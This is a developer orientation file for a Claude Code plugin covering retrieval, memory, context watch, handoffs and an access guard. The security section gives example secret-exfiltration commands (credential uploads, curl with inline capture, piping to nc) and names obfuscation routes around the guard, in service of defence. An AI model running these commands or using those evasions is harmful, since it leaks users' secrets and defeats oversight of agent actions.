# CLAUDE.md — working on Clawness

Orientation for agents/devs working **on** this repo. User-facing docs live in
[README.md](README.md); release history in [CHANGELOG.md](CHANGELOG.md). This file
captures architecture, conventions, and the *why* behind non-obvious decisions.

## What this is
A **Claude Code plugin** that retrieves relevant coding rules and injects them
into every prompt via a `UserPromptSubmit` hook. Pure Python; **PyYAML is the only
dependency**. No ML models, no services, no Docker.

## Architecture (request flow)
1. `hooks/claude_hook.py` (UserPromptSubmit) loads global rules (plugin/clone
   `rules/`) + project rules (`<project>/.clawness/rules/`), retrieves, prints the
   block to stdout → Claude sees it.
2. Retrieval engine = `clawness/core.py`: **BM25 + TF-IDF fused via RRF**, over a
   **concept-expanded** token stream (`_CONCEPT_GROUPS`) + light stemming.
   Mandatory rules (`rules/_mandatory/`) always injected; rest ranked + budget-capped.
   A **relevance floor** (`CLAW_MIN_RELEVANCE`, default 0.06, gauged on TF-IDF cosine —
   not RRF, which is rank-based) drops scattershot matches so signal-less prompts
   inject few/no ranked rules. **Codebase-aware:** the hook detects the project stack
   (`detect_stack` → `scan_project`, fresh each prompt) and passes it to `Clawness`;
   off-stack language/framework rules (`_STACK_DOMAINS` minus detected) face a higher
   floor (`CLAW_OFFSTACK_MIN_RELEVANCE`, default 0.15) so e.g. a Python repo doesn't
   surface SQL/React noise, while strong cross-domain matches still pass. Cross-cutting
   domains (general/meta/workflows/security/testing) are never penalized.
   **`science`/`research` are cross-cutting but topically NARROW** (`_TOPICAL_DOMAINS`),
   so they take a middle floor (`CLAW_TOPICAL_MIN_RELEVANCE`, default 0.12) between the
   base and off-stack floors: un-gated, so a researcher in a bare/LaTeX-only directory
   still gets them, but they must genuinely match. At the base floor (1.3.0) 11 of 30
   routine dev prompts surfaced one; the stack filter makes this WORSE, not better,
   since suppressing off-stack rules frees top-k slots these then fill. That is also
   why `clawness query` (no stack) cannot see this class of bug — drive the real hook
   against a project fixture instead. Passing no
   stack (CLI/eval) disables the penalty, so eval is unaffected. ~2ms/prompt + ~3ms scan
   (retrieval is <1% of the ~400ms hook, which is dominated by interpreter startup).
   **Session-aware re-injection** (`clawness/session_state.py`): the mandatory block
   (identical every turn) renders in full only on prompt 1 and every `CLAW_FULL_EVERY`-th
   prompt after (default 5); other turns get a one-line id list — the rules stay just as
   binding, only their re-statement shrinks. State is a per-session JSON file in the OS
   temp dir (never the project), fails toward a full render on any error. Project
   memory does NOT ride this cadence — see below.
3. **Project memory** (`<project>/.clawness/memory.md`, logic in `clawness/memory.py`):
   a per-codebase lessons log, appended after the rules block. **Retrieved, not
   dumped** (since 1.2.0): `parse_memory` splits the file into `## Always` entries
   (pinned, always injected, capped by `CLAW_MEMORY_PIN_BUDGET`) and `## Lessons`
   entries, which `rank_lessons` ranks against the prompt — same BM25 + TF-IDF + RRF
   primitives as the rules, so a 200-entry log still costs a flat handful of lines.
   HTML comments and headings are stripped: they're for the human editing the file and
   cost ~107 tokens/turn on an otherwise *empty* log, which is what prompted the rework.
   Three deliberate choices:
   - **Memory ranks in its OWN pass, never merged into `Clawness._ranked_rules`.**
     Lessons can't displace rules from `top_k`, rules can't displace lessons, and
     `rank_ids` stays rule-only so `tests/ground_truth.json` and the CI eval floors are
     immune to whatever a user writes in their memory file.
   - **`memory.py` has its own stopword list.** Across 113 rules, IDF flattens
     "this"/"the"/"needs" on its own; across a 4-40 entry log those words look
     discriminating, and without the filter "rename THIS variable" matched "BUILDKIT=1
     on THIS machine" above the floor. Don't remove it thinking IDF covers it.
   - **`CLAW_MEMORY_MIN_RELEVANCE` defaults to 0.20, not the rules' 0.06.** Small-corpus
     cosines run hot; measured, genuine hits score 0.44-0.70 and incidental overlap
     0.07-0.09, so 0.20 sits in the gap.
   Because the block is already prompt-specific and ~3 lines, it ships every turn rather
   than being abbreviated. `memory_changed` (session_state) now drives `force_recent`
   instead of a cadence: the newest entries show on the session's first prompt and on
   any turn after the file changed, so a lesson written mid-session is never invisible.
   Memory (and the few fixed suggested-action lines) sit *outside* `CLAW_BUDGET` by
   design — counting them in would make rule selection vary with memory length; total
   injection ≈ `CLAW_BUDGET` + `CLAW_MEMORY_BUDGET` + a few fixed lines.
   `ENF-MEM-001` (mandatory) is the single rule telling Claude to maintain the file and
   carries the numeric contract (one line, <=120 chars, max 3 pinned, prune past 40); it
   absorbed the near-duplicate ranked `WF-LESSONS-001`, which is gone. The file is
   auto-created on first session by `hooks/memory_init.py` (SessionStart) — gated to
   git work trees, opt-out `CLAW_NO_MEMORY`; it injects a note (like `git_check`) so
   Claude announces the file to the user, since hooks can't prompt directly.
4. **Context-pressure watch** (`clawness/context_watch.py`, called from `claude_hook`):
   reads the session's own transcript (`transcript_path` in the hook payload; falls
   back to reconstructing `<config>/projects/<slugified-cwd>/<session_id>.jsonl`) and
   warns the user *before* the window fills and quality degrades. Rides the existing
   UserPromptSubmit hook rather than adding one — it's a file tail plus arithmetic
   (~0.5ms), not worth another process spawn per prompt.
   - **Context size is read, not estimated.** The last assistant entry's
     `input_tokens + cache_creation_input_tokens + cache_read_input_tokens` IS the
     prompt that was just sent. Only the last 256KB of the file is read (a transcript
     reaches several MB; a 6MB tail costs ~0.7ms), walking backwards to the newest
     usage record.
   - **The window can't be read from the transcript** — a 1M session records the same
     `claude-opus-5` model id as a 200k one. `infer_limit` therefore goes
     `CLAW_CONTEXT_LIMIT` → the `[1m]` marker on `model` in settings(.local).json →
     observed-usage tier bump. **Don't drop the settings check**: without it a 1M
     session false-alarms all through 140k-200k, which is exactly how users learn to
     ignore the warning.
   - Levels: `warn` (70%, brief mention), `urgent` (85%, recommend a fresh session and
     offer a handoff + memory write), and `surge` — a single turn adding >=12% of the
     window with <=5 turns of headroom left, so a session filling fast is flagged while
     there's still room to act. Below `MIN_TOKENS_TO_REPORT` (20k) it never speaks.
   - **Each level alerts at most once per session** (`should_alert_context`);
     escalation warn→urgent passes, repeats don't. The condition stays true once
     reached, so without dedup it would fire every prompt for the rest of the session.
   - Fails silent on every path, opt-out `CLAW_NO_CONTEXT_WATCH`.
5. **Session handoff** (`clawness/handoff.py` + `hooks/handoff_check.py`, SessionStart):
   the other half of the context watch. At ~85% full it offers to write
   `<project>/.clawness/handoff.md`; the SessionStart hook injects that file when the
   *next* session in the project starts, so the user never has to remember it exists
   or know its path. `WF-HANDOFF-001` (ranked) tells Claude where and how to write one.
   - **handoff.md and memory.md are different things and must not be merged.**
     memory.md accumulates durable lessons and is committed/shared; handoff.md is one
     transient "here's where I was", overwritten each time and personal (gitignore it).
   - **The note injects the handoff's CONTENT, not a pointer.** A pointer costs the
     next session a tool call and depends on Claude choosing to follow it — the whole
     point is that the user shouldn't have to shepherd the pickup.
   - **The file's existence IS the state** — a handoff at that path hasn't been picked
     up. There is deliberately no age cutoff or done-flag: an old handoff nobody
     archived is still outstanding. `archive_handoff` moves it to
     `.clawness/handoffs/done/<timestamp>.md` when superseded (a new one is written, or
     the user says it's finished), which clears the live slot and keeps history.
     Nothing is ever deleted; an over-eager archive then costs nothing. Age IS shown in
     the note, but only as information — it never branches the instruction.
   - Truncation keeps the **head** (budget `CLAW_HANDOFF_BUDGET`, default 2000) —
     opposite of the lessons log, because a handoff's summary and state are written at
     the top. Opt-out `CLAW_NO_HANDOFF`.
6. **Model-tier advisor** (`clawness/model_advisor.py`, stashed by `stack_detect`,
   surfaced by `claude_hook` on prompt 1): compares the session's model tier against
   what the opening task looks like and injects a note when they look mismatched.
   - **The model must be carried across two hook events.** ONLY `SessionStart`
     receives a `model` field (and the docs mark it optional — hence the
     `read_settings_model()` fallback); `UserPromptSubmit` never does. But at
     SessionStart there is no task yet, and codebase complexity is the wrong signal
     (a README edit in a huge repo is trivial). So `stack_detect` stashes the model
     via `session_state.record_model`, and prompt 1 of `claude_hook` reads it back.
     Don't "simplify" this into one hook — neither event has both halves.
   - **Evidence, not verdict.** The note reports the matched signals and explicitly
     licenses Claude to say nothing. The heuristic WILL misfire; letting Claude
     filter against the real task means a wrong guess usually dies before the user
     sees it. A hook asserting "switch to X" would surface every false positive.
   - **The thresholds are asymmetric on purpose.** An upgrade hint needs 2 signal
     groups. A downgrade needs 2 *and* zero upgrade signals *and* a short prompt,
     because a wrong downgrade is invisible harm — a shallower answer on hard work
     reads exactly like a good one — while a wrong upgrade costs visible money.
   - **opus and fable are both `TIER_TOP`.** There is no defensible ordering between
     them, so a top-tier session is never told to move.
   - Fails **silent**, not open (the opposite of the context watch): an unknown model
     or unreadable ledger means say nothing. Dedup is once per project per tier in
     `.clawness/model_advice.json`, so a tier change re-arms it. `CLAW_NO_MODEL_ADVISOR`.
   - `tests/model_advisor_cases.json` is its eval set, and the CI floor is **zero
     false positives** on routine prompts. Grow that file when tuning signals.

7. **Session security** (defense, not retrieval — independent of the engine):
   - `hooks/access_guard.py` (PreToolUse; logic in `clawness/guard.py`) classifies each
     Bash/Write/Edit/Read call → `allow`/`ask`/`deny`. A hook decision overrides the
     user's permission allowlist, so `ask` fires *even on "always-allowed" tools* — the
     answer to approval fatigue. **`deny` is a HARD block with no in-Claude override**
     (verified on the VS Code build — the user can't approve it inline; retrying re-fires),
     so reserve it for ~zero-legit-use / exfil-signature cases: cloud-metadata,
     catastrophic `rm -rf` (a filesystem root / home / a *system dir itself* — a delete
     DEEPER under a system dir is ASK, not deny), reading a local secret into a network
     call, uploading a local secret (incl. via a cloud CLI — `aws s3 cp ~/.aws/credentials
     s3://…`), and **inline-capture** exfil — `$(…)`/backtick output embedded in a data
     upload to a host absent from the codebase. **The exfil denies are evaluated UP FRONT
     (before any ASK tier) on purpose** — `_classify_bash` returns on first match, so a
     compound command (`rm -rf ~/x && curl -d "$(cat s)" https://absent/`) would otherwise
     let an early ASK clause mask a later deny; don't reorder them below the ASK checks.
     A shell `>`/`>>` redirect to a control file (`_bash_redirect_hits_control_file`) is
     also caught, since it bypasses the Write-tool gate. Crucially a
     bare token env var (`Bearer $API_TOKEN`) is NOT a deny signal — it's routine auth,
     so a token-authenticated POST to an internal host absent from committed source only
     ASKS (see `_INLINE_CAPTURE_RE` vs `_VAR_EXPANSION_RE`). **`ask`** (which DOES surface
     an approve dialog) covers the dual-use and scope cases: pipe-to-shell and
     `git push --force` (not `--force-with-lease`, allowed), writes outside the project
     root (temp/plan files exempt via `is_plan_file`), credential-shaped reads, named
     installs, deep-system-dir deletes, data piped into a raw socket (`… | nc`), **any**
     cloud-storage upload (`aws s3 cp`/`gsutil`/`az blob`), and a credential-named URL
     download. The `_deny` reason text must not tell the model to "proceed on
     confirmation" — it can't; it points to the real escape hatches (run it yourself /
     `CLAW_NO_ACCESS_GUARD=1`). **Data-bearing curl/scp egress is provenance-tiered**:
     `value_in_project` searches the destination host across the project's own text files
     — a bounded walk that EXCLUDES `.claude/` so a hijacked skill can't launder a host
     into "trusted", 15-min verdict cache — endogenous (in the repo) → ask, absent → ask
     (or deny for the inline-capture shape). Note a known host still ASKS for a data
     upload; provenance only flips the inline-capture case between deny and ask, so it can
     never buy a *silent* egress. **Cloud uploads are deliberately NOT provenance-downgraded
     to allow** — source is forgeable (a rogue postinstall or injected Write could plant a
     bucket name), so `aws s3 cp <secret> s3://planted-bucket` would be silent exfil; every
     cloud upload asks once per bucket instead. Asks once **per destination** per session:
     for egress the dedup key is the host/bucket (`_egress_targets`), not the exact command,
     so iterating upload payloads to one host asks once; an **out-of-project write keys on
     its parent DIRECTORY** (approve a location once — e.g. the `~/.claude` memory dir — and
     sibling writes there don't re-nag; a security-*control* file stays keyed per-file so
     blessing a dir can't cover a sibling kill switch); other tiers key on the path/command. Keys are sha256-hashed so raw command
     text never touches disk. **Two-phase**: PreToolUse records a target `pending`; a
     PostToolUse companion (same matcher) promotes it to `confirmed` only once the call
     actually completes AND the payload carries a `tool_response` (execution evidence —
     defense-in-depth so a declined call never settles even if a build fired PostToolUse
     for it), so a declined/abandoned ask re-asks on retry instead of going silent for the
     session. Ledger/cache writes are atomic (`atomic_write_text`, temp + `os.replace`) so
     concurrent sessions never read a torn file. Pure-logic core, fails open, `CLAW_NO_ACCESS_GUARD`.
   - `hooks/trust_ledger.py` (SessionStart; logic in `clawness/trust.py`) keeps TOFU
     fingerprints of skills/agents/commands/MCP servers in `.clawness/trust_ledger.json`
     and injects a note when one changed/appeared; `clawness audit-skills` scans those
     artifacts for injection tells. Fails open, `CLAW_NO_TRUST_LEDGER`.

## Key files
- `clawness/core.py` — engine (rules loader, tokenizer + `_CONCEPT_GROUPS`, BM25,
  TF-IDF, RRF, `Clawness` class, `rank_ids`, rendering).
- `clawness/memory.py` — project-memory parsing + ranking (`parse_memory`,
  `rank_lessons`, `render_memory_block`). Imports the primitives from `core`, so
  `core.render_memory_block` delegates via a *deferred* import to avoid a cycle.
- `clawness/cli.py` — `clawness` CLI: query, stats, lint, bench, eval, init, plan, agents-md, audit-skills.
- `clawness/plan.py` — plan-gate logic (`gate_decision`, `is_plan_file`, session approval).
- `clawness/guard.py` — access-guard logic (`classify_tool_call`, `value_in_project`, ask-ledger).
- `clawness/trust.py` — trust-ledger logic (`scan_artifacts`, `diff_ledger`, `scan_injection_tells`).
- `clawness/session_state.py` — per-session prompt-count/memory-mtime tracking for
  session-aware re-injection (`bump_prompt_count`, `memory_changed`, `should_show_full`),
  plus context-watch state (`context_snapshot`, `should_alert_context`).
- `clawness/context_watch.py` — context-pressure watch (`read_context_tokens`,
  `infer_limit`, `assess`, `render_alert`, `find_transcript`). `limit_from_settings`
  delegates the settings read to `model_advisor.read_settings_model` (one source of
  truth for "what model is configured?"), keeping only the `[1m]` reading here.
- `clawness/model_advisor.py` — model-tier advice (`normalize_tier`, `assess`,
  `should_advise`, `render_advice`, `read_settings_model`).
- `clawness/handoff.py` — session handoff (`find_handoff`, `render_handoff_note`,
  `describe_age`, `HANDOFF_TEMPLATE`).
- `hooks/` — runtime hooks (`claude_hook`, `compress_output`, `plan_gate`, `access_guard`,
  `trust_ledger`, `git_check`, `memory_init`, `handoff_check`, `stack_detect`, `ensure_deps`) + setup helpers (`setup_settings/agents/skills` — manual install only).
- `rules/<domain>/*.yml` — the corpus (165 rules / 23 domains; `_mandatory/` = always-on).
  Beyond the language domains: `llm/` (building with models — stack-gated, detected from
  anthropic/openai/langchain deps), `science/` and `research/` (physics/maths/engineering
  practice and research method — **cross-cutting on purpose**, since a researcher often
  works in a bare or LaTeX-only directory where gating would silence them), plus
  `reliability/`, `testing/` and `ci/`.
- `agents/*.md`, `skills/<name>/SKILL.md` — auto-discovered by the plugin.
- `.claude-plugin/{plugin.json,marketplace.json}` — plugin + marketplace manifests.
- `tests/ground_truth.json` — labeled eval queries (grow it when adding rule areas).

## Design decisions (don't undo without reading these)
- **Lexical + concept retrieval only.** model2vec/semantic was removed in 0.3.0:
  a per-prompt hook is a fresh process every turn, so the model reloaded each time
  (blew the hook timeout), and it scored no better than lexical on the eval. The
  **concept dictionary (`_CONCEPT_GROUPS`) is our "semantic"** — enrich *that* for
  better recall, never add a model to the hot path.
- **Hook commands use a portable interpreter picker** `for p in python3 python py; …`
  (Windows has no `python3`; Claude runs hooks via a POSIX shell). Same picker in
  `plugin.json` and what `setup_settings.py` writes.
- **Plan gate rides native plan mode, and PROMPTS — never hard-blocks.** `PreToolUse`
  emits `ask` (not `deny`) for edits until approval is recorded for the session, so an
  unapproved session is nudged with a native approve dialog, never trapped. Approval is
  recorded on `PostToolUse` for ExitPlanMode (native plan approval) OR for the first
  completed write (the user approved the ask — gated on a `tool_response` so a declined
  ask never settles), so the prompt fires at most once per session. It used to `deny`,
  which on the VS Code build has no in-Claude override and pointed users at `clawness plan
  approve` — a CLI the plugin path doesn't install, stranding them; `ask` has a working
  Yes button, so that trap is gone. **Plan-file writes (`<config>/plans/`) are exempt**
  (`is_plan_file`) — gating them is a catch-22. Fails open on any error.
- **Agent `model:` is split by task type, and the judgment agents must stay on
  `inherit`.** Subagent `model:` defaults to `inherit`, so pinning it is an ACTIVE
  override of the user's choice — until 1.4.0 all seven agents pinned `sonnet`, which
  meant an Opus user's `/clawness:audit` silently ran a tier below what they picked.
  `security-red-team`, `security-blue-team`, `arch-challenger` and `code-critic` now
  omit `model:` entirely; `test-writer`, `perf-auditor` and `refactor-advisor` keep
  `sonnet` (mechanical work, and `sonnet` is an alias so it won't rot). **Never
  hardcode `opus`/`fable` in a shipped agent** — a distributed plugin can't know the
  user's plan, access or budget, and forcing a frontier tier is the same error as the
  old downgrade pointed the other way. `effort:`/`maxTurns:` are unrelated and stay.
- **Token efficiency:** mandatory rules render compact (id+RULE only); `CLAW_VERBOSE`
  / `CLAW_COMPACT` toggle. Keep the per-turn block lean.
- **Two install paths:** plugin (hooks declared in `plugin.json`, loaded from cache)
  vs manual (`install.sh`/`install.ps1` → editable `pip install` + `setup_settings.py`
  writes hooks to `settings.json`). The plugin path does NOT install the `clawness`
  CLI — plugin users verify via `/clawness:status`.
- **Naming:** package `clawness`, env vars `CLAW_*`, project dir `.clawness/`. (The
  `infinri/Writ` mentions in README and CHANGELOG are upstream credit / historical
  record — leave those. Everywhere else was renamed to Clawness; `install.ps1` keeps a
  `-WritDir` alias for back-compat only.)
- **The access guard is a harm-reduction tripwire, not a security boundary.** It is
  regex/heuristics over tool inputs the agent controls, so a determined adversary can
  obfuscate around it (`| base64 -d | sh`, download-then-exec, `python -c`, token
  munging). It exists to catch *honest mistakes and low-effort/​injected attacks* and
  to break approval-fatigue autopilot — not to sandbox a hostile agent. The real
  boundary is the deferred devcontainer + egress allowlist; keep that framing in the
  docs so users don't over-trust it. **Design rule: never nag normal dev work.**
  In-project secret reads and hardcoded/​endogenous values are allowed silently; only
  reaching for secrets *outside* the project, *sending* data to a host absent from the
  codebase, or editing the guard's own kill-switch files (`_is_control_file`) trips a
  prompt. When tightening detection, widen DENY conservatively (a false deny blocks
  real work) and prefer ASK.

## Dev workflow
- Test: `python -m pytest tests/` (set `CLAW_NO_PLAN_GATE=1` if the gate blocks your
  edits in this repo — but **unset it before running the suite**, since the plan-gate
  tests assert the gate is on and will fail with it disabled).
- Rules: `clawness lint` (rejects missing fields **and vague phrasing**),
  `clawness eval --floor-mrr 0.85 --floor-hit 0.95` (MRR@5/hit-rate; CI-gated),
  `clawness stats`, `clawness bench`.
- CI (`.github/workflows/ci.yml`) runs lint + tests + eval across ubuntu/macOS/windows × py3.10–3.14.

## Releasing
- **`marketplace.json` sets `"source": "./"`, so a push to `main` IS a release.** Users
  get whatever `main` holds on their next `claude plugin update` — the tag and GitHub
  release are markers for humans, not the delivery mechanism. Consequence: `main` must
  never sit ahead of the version it declares. Anything user-visible that lands there
  (rules, hooks, README, manifest copy) needs a version bump in the same push, or the
  work belongs on a branch until you're ready to release.
- **Every version in CHANGELOG.md gets exactly one tag and one GitHub release.** Don't
  leave an entry untagged, and don't stack several unreleased bumps — collapse the
  batch into one version instead. (v1.2.0 shipped that way: three features, one minor.)
- The sequence: bump the four version places → CHANGELOG entry → `pytest` + `clawness
  lint` + `clawness eval` → commit → `git tag -a vX.Y.Z` → push `main` and the tag →
  `gh release create vX.Y.Z --notes-file <extracted CHANGELOG entry>`. Verify with
  `git rev-list -n1 vX.Y.Z` against `origin/main` and
  `git show vX.Y.Z:clawness/__init__.py`.
- Publishing is outward-facing — confirm the release shape with the user before pushing
  a tag or creating a release.

## Gotchas
- **Always pass `encoding="utf-8"` on file I/O and stdin/stdout.** The corpus uses
  em-dashes/smart-quotes; bare `open()`/`read_text()`/`sys.stdin` default to cp1252
  on Windows and mangle them into mojibake (`—` → `â€"`) *at load time*. `clawness
  lint` now flags non-UTF-8 / U+FFFD rule files; keep new reads/writes UTF-8.
- **Keep retrieval a couple of ms** — no heavy imports or model loads in
  `claude_hook.py`/`core.py`. It was ~0.8ms at 121 rules and is ~1.6ms at 165; the
  concept-expansion pass scales with both corpus size and `_CONCEPT_GROUPS`, so measure
  with `clawness bench` when adding either.
- **Version lives in 4 places** — bump `pyproject.toml`, `.claude-plugin/plugin.json`,
  `.claude-plugin/marketplace.json`, and `clawness/__init__.py` (`__version__`) together,
  and add a CHANGELOG entry. `tests/test_version.py` asserts all four agree + a CHANGELOG
  entry exists, so a drift fails CI.
- Rule YAML: `id, domain, severity, tags, triggers, when, rule, violation, correct`
  (concept terms must be single tokens; multi-word phrases never match).
- **`{{CURRENT_DATE}}`** in any rule field is replaced at render time with the live
  month + year (e.g. "June 2026") — see `_DATE_TOKEN`/`_current_date` in `core.py`.
  Substituted only on render, not in the search text, so retrieval stays
  date-independent. `ENF-CURRENT-001` uses it.
- Two things can't be tested from a sandbox: a real `pip install -e .` completing,
  and plugin hooks on a real Windows + python.org box. Smoke-test both before release.
  The access guard's decline path is now covered two ways so it's no longer a
  load-bearing manual check: `tests/test_access_guard_hook.py` drives the real hook at
  the dispatch level (PreToolUse records `pending`, PostToolUse confirms only WITH a
  `tool_response`), and the confirm additionally requires that execution evidence — so
  even if a build ever fired PostToolUse for a declined call, it wouldn't settle. A
  real-session decline click-test (ask → "no" → retry → must ask again) is still a nice
  final sanity check, but defense-in-depth no longer rests on it.
